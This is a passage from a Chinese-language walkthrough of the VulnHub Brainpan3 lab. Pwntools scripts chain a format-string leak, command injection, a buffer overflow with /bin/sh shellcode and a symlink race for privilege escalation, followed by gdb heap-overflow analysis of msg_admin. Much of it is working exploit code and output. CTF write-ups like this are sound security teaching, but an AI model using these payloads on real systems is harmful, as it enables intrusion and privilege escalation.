<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;192.168.56.117&#x27;</span></span><br><span class="line">PORT = 1337</span><br><span class="line"></span><br><span class="line">r = remote(HOST, PORT)</span><br><span class="line">r.sendline(<span class="string">&#x27;%d.&#x27;</span> * 6)</span><br><span class="line">r.recvuntil(<span class="string">&quot;ACCESS CODE: &quot;</span>)</span><br><span class="line">output = r.recv()</span><br><span class="line">code = output.split(<span class="string">&#x27;.&#x27;</span>)[2]</span><br><span class="line">log.info(<span class="string">&quot;Code identified: &#123;&#125;&quot;</span>.format(code))</span><br><span class="line">r.sendline(code)</span><br><span class="line">r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">shellcode = <span class="string">&#x27;%x.&#x27;</span> * 70</span><br><span class="line">r.clean()</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line">r.recvuntil(<span class="string">&quot;SESSION: &quot;</span>)</span><br><span class="line">session_name = r.recvuntil(<span class="string">&#x27;\n&#x27;</span>).split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">n_index = session_name.index(<span class="string">&#x27;4e&#x27;</span>)</span><br><span class="line">log.info(<span class="string">&quot;Report &#x27;N&#x27; at offset &#123;&#125;&quot;</span>.format(n_index))</span><br><span class="line">n_index = session_name.index(<span class="string">&#x27;4e&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;Y&#x27;</span> * (4*(n_index-2) + 1) )</span><br><span class="line"><span class="keyword">for</span> <span class="built_in">command</span> <span class="keyword">in</span> [<span class="string">&#x27;uname -a&#x27;</span>, <span class="string">&#x27;whoami&#x27;</span>, <span class="string">&#x27;id&#x27;</span>]:</span><br><span class="line">    r.clean()</span><br><span class="line">    r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;$(&#123;&#125; &gt;&amp;2)&#x27;</span>.format(<span class="built_in">command</span>))</span><br><span class="line"></span><br><span class="line">    r.recvuntil(<span class="string">&quot;SENDING TO REPORT MODULE&quot;</span>)</span><br><span class="line">    output = r.recvuntil(<span class="string">&#x27;[+]&#x27;</span>).split(<span class="string">&#x27;\n&#x27;</span>)[2]</span><br><span class="line">    log.success(<span class="string">&quot;&#123;&#125; - &#123;&#125;&quot;</span>.format(<span class="built_in">command</span>, output))</span><br><span class="line">r.clean()</span><br><span class="line">r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;$(/bin/bash -i &gt;&amp;2)&#x27;</span>)</span><br><span class="line">offset = cyclic_find(<span class="string">&#x27;baaa&#x27;</span>)</span><br><span class="line">shellcode = <span class="string">&#x27;A&#x27;</span> * cyclic_find(<span class="string">&#x27;baaa&#x27;</span>) + p32(0x804a080)</span><br><span class="line">buffer = 116 - len(shellcode)</span><br><span class="line">binsh_shellcode = asm(shellcraft.sh())</span><br><span class="line">argv1 = <span class="string">&#x27;&quot;A&quot; * &#123;&#125; + &quot;&#123;&#125;&quot; + &quot;C&quot; * &#123;&#125;&#x27;</span>.format(offset, r<span class="string">&#x27;\x80\xa0\x04\x08&#x27;</span>, buffer)</span><br><span class="line">argv2 = <span class="string">&#x27;&#x27;</span>.join(<span class="string">&#x27;\\x&#123;&#125;&#x27;</span>.format(enhex(binsh_shellcode)[x:x+2]) <span class="keyword">for</span> x <span class="keyword">in</span> xrange(0, len(enhex(binsh_shellcode)), 2))</span><br><span class="line">actual_shellcode = <span class="string">&quot;&quot;</span><span class="string">&quot;./cryptor <span class="subst">$(python -c &#x27;print &#123;&#125;&#x27;)</span> <span class="subst">$(python -c &#x27;print <span class="string">&quot;&#123;&#125;&quot;</span>&#x27;)</span>&quot;</span><span class="string">&quot;&quot;</span>.format(argv1, argv2)</span><br><span class="line">log.info(actual_shellcode)</span><br><span class="line">r.sendline(<span class="string">&#x27;cd /home/reynard/private&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    r.clean()</span><br><span class="line">    r.sendline(actual_shellcode)</span><br><span class="line">    r.clean()</span><br><span class="line">    r.sendline(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">    output = r.recv()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;reynard&#x27;</span> <span class="keyword">in</span> output:</span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">log.info(<span class="string">&quot;Shell recevied: reynard&quot;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>运行上面的脚本之后，等待一小会儿，将会接收到一个reynard的shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan3/2<span class="comment"># python bp3.py </span></span><br><span class="line">[+] Opening connection to 192.168.56.117 on port 1337: Done</span><br><span class="line">[*] Code identified: 2919</span><br><span class="line">[*] Report <span class="string">&#x27;N&#x27;</span> at offset 65</span><br><span class="line">[+] uname -a - Linux brainpan3 3.16.0-41-generic <span class="comment">#55~14.04.1-Ubuntu SMP Sun Jun 14 18:44:35 UTC 2015 i686 i686 i686 GNU/Linux</span></span><br><span class="line">[+] whoami - anansi</span><br><span class="line">[+] id - uid=1000(anansi) gid=1003(webdev) groups=1000(anansi)</span><br><span class="line">[*] ./cryptor $(python -c <span class="string">&#x27;print &quot;A&quot; * 4 + &quot;\x80\xa0\x04\x08&quot; + &quot;C&quot; * 108&#x27;</span>) $(python -c <span class="string">&#x27;print &quot;\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80&quot;&#x27;</span>)</span><br><span class="line">[*] Shell recevied: reynard</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ id</span><br><span class="line">uid=1000(anansi) gid=1003(webdev) euid=1002(reynard) groups=1002(reynard)</span><br><span class="line">$ whoami</span><br><span class="line">reynard</span><br><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">/home/reynard/private</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub207.jpg"></p>
<h2 id="步骤5"><a href="#步骤5" class="headerlink" title="步骤5"></a>步骤5</h2><p>再进行一次勘测，将显示以下cron作业：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cat /etc/cron.d/*</span><br><span class="line">* * * * * root <span class="built_in">cd</span> /opt/.messenger; <span class="keyword">for</span> i <span class="keyword">in</span> *.msg; <span class="keyword">do</span> /usr/<span class="built_in">local</span>/bin/msg_admin 1 <span class="variable">$i</span>; rm -f <span class="variable">$i</span>; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>查看/opt/.messenger的特权，看到以下内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ls -la /opt</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x  3 root root 4096 May 19  2015 .</span><br><span class="line">drwxr-xr-x 21 root root 4096 Jun 17  2015 ..</span><br><span class="line">drwxrwx---  3 root dev  4096 Feb  6 13:04 .messenger</span><br></pre></td></tr></table></figure>

<p>看到一个由root执行的命令，该命令从/opt/.messenger目录中提取文件。为此，需要具有开发人员组权限的用户。检查/etc/passwd的尾部，可以看到puck。看他的id：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ id puck</span><br><span class="line">uid=1001(puck) gid=1001(puck) groups=1001(puck),1004(dev)</span><br></pre></td></tr></table></figure>

<p>他确实具有dev特权，允许他访问/opt/.messenger。来看看box上的puck用户。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /home/puck</span><br><span class="line">$ ls -la</span><br><span class="line">total 12</span><br><span class="line">drwxrwx--- 2 reynard dev     4096 Jun 17 22:11 .</span><br><span class="line">drwxr-xr-x 3 root    root    4096 May 19 23:35 ..</span><br><span class="line">-rw-r--r-- 1 reynard reynard   21 Jun 17 22:11 key.txt</span><br><span class="line">$ cat key.txt</span><br><span class="line">9H37B81HZYY8912HBU93</span><br></pre></td></tr></table></figure>

<p>box上还有其他key吗？</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ find / -name key* 2&gt;/dev/null</span><br><span class="line">/mnt/usb/key.txt</span><br></pre></td></tr></table></figure>

<p>不知道这些key是做什么用的。碰到一个小路障会做什么？侦察！查看netstat，看到另一个服务处于活动状态：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ netstat -antop | grep LIST</span><br><span class="line">(Not all processes could be identified, non-owned process info</span><br><span class="line"> will not be shown, you would have to be root to see it all.)</span><br><span class="line">tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      -                off (0.00/0/0)</span><br><span class="line">tcp        0      0 0.0.0.0:1337            0.0.0.0:*               LISTEN      -                off (0.00/0/0)</span><br><span class="line">tcp        0      0 127.0.0.1:7075          0.0.0.0:*               LISTEN      -                off (0.00/0/0)</span><br></pre></td></tr></table></figure>

<p>连接到它</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nc localhost 7075</span><br><span class="line">open: No such file or directory</span><br><span class="line">Incorrect key</span><br></pre></td></tr></table></figure>

<p>不知道它来自什么服务，执行一个系统范围的字符串来尝试查找导致此问题的二进制文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ find / -executable &gt; exes</span><br><span class="line">$ <span class="keyword">for</span> f <span class="keyword">in</span> $(cat exes); <span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">$f</span> &gt;&gt; output; strings <span class="variable">$f</span> | grep <span class="string">&quot;Incorrect key&quot;</span> &gt;&gt; output; <span class="keyword">done</span></span><br><span class="line">$ grep Incorrect output -B1</span><br><span class="line">/usr/<span class="built_in">local</span>/sbin/trixd</span><br><span class="line">Incorrect key</span><br></pre></td></tr></table></figure>

<p>并确认</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ strings /usr/<span class="built_in">local</span>/sbin/trixd | grep Incorrect</span><br><span class="line">Incorrect key</span><br></pre></td></tr></table></figure>

<p>将trixd加载到IDA中，看到二进制文件正在检查/mnt/usb/key.txt是否为符号链接，如果是，则立即退出。从这里，它同时打开/mnt/usb/key.txt和/home/puck/key.txt并检查它们是否相同。如果它们相同，将得到一个/bin/sh shell。否则，会看到错误的密钥消息。解决此问题的方法是连接到服务，删除/mnt/usb/key.txt，然后将/home/puck/key.txt符号链接到/mnt/usb/key.txt。如果时间安排正确，将在检查后进行符号链接，绕过它。不想将binjitsu放在VM本身上，可以在这部分使用标准库函数。再次，为了通过一个脚本来完成这项工作，将一个脚本写入磁盘并执行该脚本，以使的shell具有puck的功能。的新代码如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;192.168.56.117&#x27;</span></span><br><span class="line">PORT = 1337</span><br><span class="line"></span><br><span class="line">r = remote(HOST, PORT)</span><br><span class="line">r.sendline(<span class="string">&#x27;%d.&#x27;</span> * 6)</span><br><span class="line">r.recvuntil(<span class="string">&quot;ACCESS CODE: &quot;</span>)</span><br><span class="line">output = r.recv()</span><br><span class="line">code = output.split(<span class="string">&#x27;.&#x27;</span>)[2]</span><br><span class="line">log.info(<span class="string">&quot;Code identified: &#123;&#125;&quot;</span>.format(code))</span><br><span class="line">r.sendline(code)</span><br><span class="line">r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">shellcode = <span class="string">&#x27;%x.&#x27;</span> * 70</span><br><span class="line">r.clean()</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line">r.recvuntil(<span class="string">&quot;SESSION: &quot;</span>)</span><br><span class="line">session_name = r.recvuntil(<span class="string">&#x27;\n&#x27;</span>).split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">n_index = session_name.index(<span class="string">&#x27;4e&#x27;</span>)</span><br><span class="line">log.info(<span class="string">&quot;Report &#x27;N&#x27; at offset &#123;&#125;&quot;</span>.format(n_index))</span><br><span class="line">n_index = session_name.index(<span class="string">&#x27;4e&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;Y&#x27;</span> * (4*(n_index-2) + 1) )</span><br><span class="line"><span class="keyword">for</span> <span class="built_in">command</span> <span class="keyword">in</span> [<span class="string">&#x27;uname -a&#x27;</span>, <span class="string">&#x27;whoami&#x27;</span>, <span class="string">&#x27;id&#x27;</span>]:</span><br><span class="line">    r.clean()</span><br><span class="line">    r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;$(&#123;&#125; &gt;&amp;2)&#x27;</span>.format(<span class="built_in">command</span>))</span><br><span class="line"></span><br><span class="line">    r.recvuntil(<span class="string">&quot;SENDING TO REPORT MODULE&quot;</span>)</span><br><span class="line">    output = r.recvuntil(<span class="string">&#x27;[+]&#x27;</span>).split(<span class="string">&#x27;\n&#x27;</span>)[2]</span><br><span class="line">    log.success(<span class="string">&quot;&#123;&#125; - &#123;&#125;&quot;</span>.format(<span class="built_in">command</span>, output))</span><br><span class="line">r.clean()</span><br><span class="line">r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;$(/bin/bash -i &gt;&amp;2)&#x27;</span>)</span><br><span class="line">offset = cyclic_find(<span class="string">&#x27;baaa&#x27;</span>)</span><br><span class="line">shellcode = <span class="string">&#x27;A&#x27;</span> * cyclic_find(<span class="string">&#x27;baaa&#x27;</span>) + p32(0x804a080)</span><br><span class="line">buffer = 116 - len(shellcode)</span><br><span class="line">binsh_shellcode = asm(shellcraft.sh())</span><br><span class="line">argv1 = <span class="string">&#x27;&quot;A&quot; * &#123;&#125; + &quot;&#123;&#125;&quot; + &quot;C&quot; * &#123;&#125;&#x27;</span>.format(offset, r<span class="string">&#x27;\x80\xa0\x04\x08&#x27;</span>, buffer)</span><br><span class="line">argv2 = <span class="string">&#x27;&#x27;</span>.join(<span class="string">&#x27;\\x&#123;&#125;&#x27;</span>.format(enhex(binsh_shellcode)[x:x+2]) <span class="keyword">for</span> x <span class="keyword">in</span> xrange(0, len(enhex(binsh_shellcode)), 2))</span><br><span class="line">actual_shellcode = <span class="string">&quot;&quot;</span><span class="string">&quot;./cryptor <span class="subst">$(python -c &#x27;print &#123;&#125;&#x27;)</span> <span class="subst">$(python -c &#x27;print <span class="string">&quot;&#123;&#125;&quot;</span>&#x27;)</span>&quot;</span><span class="string">&quot;&quot;</span>.format(argv1, argv2)</span><br><span class="line">log.info(actual_shellcode)</span><br><span class="line">r.sendline(<span class="string">&#x27;cd /home/reynard/private&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    r.clean()</span><br><span class="line">    r.sendline(actual_shellcode)</span><br><span class="line">    r.clean()</span><br><span class="line">    r.sendline(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">    output = r.recv()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;reynard&#x27;</span> <span class="keyword">in</span> output:</span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">log.info(<span class="string">&quot;Shell recevied: reynard&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;&quot;</span><span class="string">&quot; echo &quot;</span></span><br><span class="line">import os</span><br><span class="line">import socket</span><br><span class="line">import telnetlib</span><br><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;localhost&#x27;</span></span><br><span class="line">PORT = 7075</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    os.remove(<span class="string">&#x27;/mnt/usb/key.txt&#x27;</span>)</span><br><span class="line">except:</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">subprocess.check_output([<span class="string">&#x27;touch&#x27;</span>, <span class="string">&#x27;/mnt/usb/key.txt&#x27;</span>])</span><br><span class="line"></span><br><span class="line">r = socket.socket()</span><br><span class="line">r.connect((HOST, PORT))</span><br><span class="line"></span><br><span class="line">os.remove(<span class="string">&#x27;/mnt/usb/key.txt&#x27;</span>)</span><br><span class="line">os.symlink(<span class="string">&#x27;/home/puck/key.txt&#x27;</span>, <span class="string">&#x27;/mnt/usb/key.txt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">t = telnetlib.Telnet()</span><br><span class="line">t.sock = r</span><br><span class="line">t.interact()</span><br><span class="line"></span><br><span class="line">r.close()</span><br><span class="line"><span class="string">&quot; &gt; win.py</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&quot;python win.py&quot;</span>)</span><br><span class="line">r.clean()</span><br><span class="line">r.sendline(<span class="string">&quot;whoami&quot;</span>)</span><br><span class="line">output = r.recv()</span><br><span class="line">log.success(<span class="string">&quot;Shell received: &#123;&#125;&quot;</span>.format(output))</span><br><span class="line">sleep(1)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>运行上面的代码之后，成功的拿到了puck用户的权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan3/2<span class="comment"># python bp3.py </span></span><br><span class="line">[+] Opening connection to 192.168.56.117 on port 1337: Done</span><br><span class="line">[*] Code identified: 2796</span><br><span class="line">[*] Report <span class="string">&#x27;N&#x27;</span> at offset 65</span><br><span class="line">[+] uname -a - Linux brainpan3 3.16.0-41-generic <span class="comment">#55~14.04.1-Ubuntu SMP Sun Jun 14 18:44:35 UTC 2015 i686 i686 i686 GNU/Linux</span></span><br><span class="line">[+] whoami - anansi</span><br><span class="line">[+] id - uid=1000(anansi) gid=1003(webdev) groups=1000(anansi)</span><br><span class="line">[*] ./cryptor $(python -c <span class="string">&#x27;print &quot;A&quot; * 4 + &quot;\x80\xa0\x04\x08&quot; + &quot;C&quot; * 108&#x27;</span>) $(python -c <span class="string">&#x27;print &quot;\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80&quot;&#x27;</span>)</span><br><span class="line">[*] Shell recevied: reynard</span><br><span class="line">[+] Shell received: puck</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ id</span><br><span class="line">uid=1001(puck) gid=1004(dev) groups=1001(puck)</span><br><span class="line">$ whoami</span><br><span class="line">puck</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub208.jpg"></p>
<h2 id="步骤6"><a href="#步骤6" class="headerlink" title="步骤6"></a>步骤6</h2><p>现在，很吃力，需要完成认为是获得root shell的最后一步的工作。回到cronjob，需要分析msg_admin二进制文件。与加密二进制文件类似的方式将其从VM中提取。快速checksec</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan3/2<span class="comment"># checksec msg_admin</span></span><br><span class="line">[*] <span class="string">&#x27;/root/vulnhub/brainpan3/2/msg_admin&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<p>Canaries，NX上。ASLR开启了吗？</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cat /proc/sys/kernel/randomize_va_space</span><br><span class="line">2</span><br></pre></td></tr></table></figure>

<p>该抽出所有的止损了。从cronjob中，意识到二进制文件需要一个文件。静态分析二进制文件，看到文件需要包含名称行和由|分隔的消息。创建一个小的payload生成脚本来对此进行测试。</p>
<p>make-pwnmsg.py</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">with open(<span class="string">&#x27;pwn.msg&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) as f:</span><br><span class="line">    f.write(<span class="string">&#x27;&#123;&#125;|&#123;&#125;\n&#x27;</span>.format(<span class="string">&#x27;a&#x27;</span>*4, <span class="string">&#x27;A&#x27;</span>*10))</span><br><span class="line">    f.write(<span class="string">&#x27;&#123;&#125;|&#123;&#125;\n&#x27;</span>.format(<span class="string">&#x27;b&#x27;</span>*4, <span class="string">&#x27;B&#x27;</span>*10))</span><br><span class="line">    f.write(<span class="string">&#x27;&#123;&#125;|&#123;&#125;\n&#x27;</span>.format(<span class="string">&#x27;b&#x27;</span>*4, <span class="string">&#x27;C&#x27;</span>*10))</span><br></pre></td></tr></table></figure>

<p>运行脚本之后，生成以下的文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan3/2<span class="comment"># ls</span></span><br><span class="line">bofh  bp3.py  brainpan.8  cryptor  make-pwnmsg.py  msg_admin  pwn.msg  report  shell  test.py  trixd</span><br><span class="line">root@kali:~/vulnhub/brainpan3/2<span class="comment"># cat pwn.msg </span></span><br><span class="line">aaaa|AAAAAAAAAA</span><br><span class="line">bbbb|BBBBBBBBBB</span><br><span class="line">bbbb|CCCCCCCCCC</span><br></pre></td></tr></table></figure>

<p>在gdb中执行payload。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; r 1 pwn.msg</span><br><span class="line">Starting program: /root/vulnhub/brainpan3/2/msg_admin 1 pwn.msg</span><br><span class="line">[+] Recording 3 entries</span><br><span class="line">[+] Message from aaaa@kali</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0xf7e48f36 <span class="keyword">in</span> fputs () from /lib32/libc.so.6</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────</span><br><span class="line"> EAX  0xa</span><br><span class="line"> EBX  0x804c300 ◂— <span class="string">&#x27;bbbb&#x27;</span></span><br><span class="line"> ECX  0x0</span><br><span class="line"> EDX  0xffffbebe ◂— 0x0</span><br><span class="line"> EDI  0xa</span><br><span class="line"> ESI  0x0</span><br><span class="line"> EBP  0xffffce68 —▸ 0xffffcef8 —▸ 0xffffd0b8 —▸ 0xffffd2e8 ◂— 0x0</span><br><span class="line"> ESP  0xffffce40 —▸ 0x804c300 ◂— <span class="string">&#x27;bbbb&#x27;</span></span><br><span class="line"> EIP  0xf7e48f36 (fputs+38) ◂— mov    eax, dword ptr [esi]</span><br><span class="line">─────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────</span><br><span class="line"> ► 0xf7e48f36 &lt;fputs+38&gt;     mov    eax, dword ptr [esi]</span><br><span class="line">   0xf7e48f38 &lt;fputs+40&gt;     and    eax, 0x8000</span><br><span class="line">   0xf7e48f3d &lt;fputs+45&gt;     jne    fputs+100 &lt;0xf7e48f74&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7e48f74 &lt;fputs+100&gt;    movsx  edx, byte ptr [esi + 0x46]</span><br><span class="line">   0xf7e48f78 &lt;fputs+104&gt;    <span class="built_in">test</span>   dl, dl</span><br><span class="line">   0xf7e48f7a &lt;fputs+106&gt;    jne    fputs+143 &lt;0xf7e48f9f&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7e48f9f &lt;fputs+143&gt;    mov    ecx, dword ptr [ebp - 0x1c]</span><br><span class="line">   0xf7e48fa2 &lt;fputs+146&gt;    mov    ebx, dword ptr [esi + edx + 0x94]</span><br><span class="line">   0xf7e48fa9 &lt;fputs+153&gt;    lea    eax, [ecx + 0xf80]</span><br><span class="line">   0xf7e48faf &lt;fputs+159&gt;    lea    edx, [ecx + 0x1754]</span><br><span class="line">   0xf7e48fb5 &lt;fputs+165&gt;    mov    ecx, ebx</span><br><span class="line">──────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ esp  0xffffce40 —▸ 0x804c300 ◂— <span class="string">&#x27;bbbb&#x27;</span></span><br><span class="line">... ↓</span><br><span class="line">02:0008│      0xffffce48 —▸ 0xffffd250 —▸ 0xf7ffdab0 —▸ 0xf7fce3e0 —▸ 0xf7ffd950 ◂— ...</span><br><span class="line">03:000c│      0xffffce4c —▸ 0xf7fb5000 ◂— 0x1d6d6c</span><br><span class="line">04:0010│      0xffffce50 —▸ 0xffffcef8 —▸ 0xffffd0b8 —▸ 0xffffd2e8 ◂— 0x0</span><br><span class="line">05:0014│      0xffffce54 —▸ 0xf7fe9450 ◂— pop    edx</span><br><span class="line">06:0018│      0xffffce58 ◂— 0x0</span><br><span class="line">07:001c│      0xffffce5c —▸ 0x804c300 ◂— <span class="string">&#x27;bbbb&#x27;</span></span><br><span class="line">────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0 f7e48f36 fputs+38</span><br><span class="line">   f 1  804892c record_data+271</span><br><span class="line">   f 2  8048a89 notify_admin+193</span><br><span class="line">   f 3  8048d4d main+664</span><br><span class="line">   f 4 f7dfc811 __libc_start_main+241</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">Program received signal SIGSEGV (fault address 0x0)</span><br></pre></td></tr></table></figure>

<p>在静态分析中注意到了一些malloc。看看堆的布局。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; </span><br><span class="line">+0f30 0x804d908  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │....│....│....│....│</span><br><span class="line">...</span><br><span class="line">+0f70 0x804d948  00 00 00 00  11 00 00 00  01 00 00 00  60 d9 04 08  │....│....│....│`...│</span><br><span class="line">+0f80 0x804d958  70 d9 04 08  11 00 00 00  61 61 61 61  00 00 00 00  │p...│....│aaaa│....│</span><br><span class="line">+0f90 0x804d968  00 00 00 00  d1 00 00 00  41 41 41 41  41 41 41 41  │....│....│AAAA│AAAA│</span><br><span class="line">+0fa0 0x804d978  41 41 00 00  00 00 00 00                            │AA..│....│    │    │</span><br><span class="line">pwndbg&gt; </span><br><span class="line">+0f90 0x804d980  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │....│....│....│....│</span><br><span class="line">...</span><br><span class="line">+1000 0x804d9f0  00 00 00 00  00 00 00 00                            │....│....│    │    │</span><br><span class="line">pwndbg&gt; </span><br><span class="line">+0fc0 0x804d9f8  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │....│....│....│....│</span><br><span class="line">...</span><br><span class="line">+1000 0x804da38  00 00 00 00  11 00 00 00  01 00 00 00  50 da 04 08  │....│....│....│P...│</span><br><span class="line">+1010 0x804da48  60 da 04 08  11 00 00 00  62 62 62 62  00 00 00 00  │`...│....│bbbb│....│</span><br><span class="line">+1020 0x804da58  00 00 00 00  d1 00 00 00  42 42 42 42  42 42 42 42  │....│....│BBBB│BBBB│</span><br><span class="line">+1030 0x804da68  42 42 00 00  00 00 00 00                            │BB..│....│    │    │</span><br></pre></td></tr></table></figure>

<p>似乎的每条消息都在堆中背对背。看起来在消息之后还存在两个指针（请参见地址0x804d958和0x804da48）。消息和最后一个指针之间有多少可用空间。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; 0x804da48 - 0x804d970</span><br><span class="line">216</span><br></pre></td></tr></table></figure>

<p>怀疑可以用A溢出两个指针，抛出数据以查看是否可以控制这些指针。</p>
<p>make-pwnmsg.py</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">with open(<span class="string">&#x27;pwn.msg&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) as f:</span><br><span class="line">    f.write(<span class="string">&#x27;&#123;&#125;|&#123;&#125;\n&#x27;</span>.format(<span class="string">&#x27;a&#x27;</span>*4, cyclic(216)))</span><br><span class="line">    f.write(<span class="string">&#x27;&#123;&#125;|&#123;&#125;\n&#x27;</span>.format(<span class="string">&#x27;b&#x27;</span>*4, <span class="string">&#x27;B&#x27;</span>*10))</span><br><span class="line">    f.write(<span class="string">&#x27;&#123;&#125;|&#123;&#125;\n&#x27;</span>.format(<span class="string">&#x27;b&#x27;</span>*4, <span class="string">&#x27;C&#x27;</span>*10))</span><br></pre></td></tr></table></figure>

<p>在gdb中再次执行相同的payload。</p>
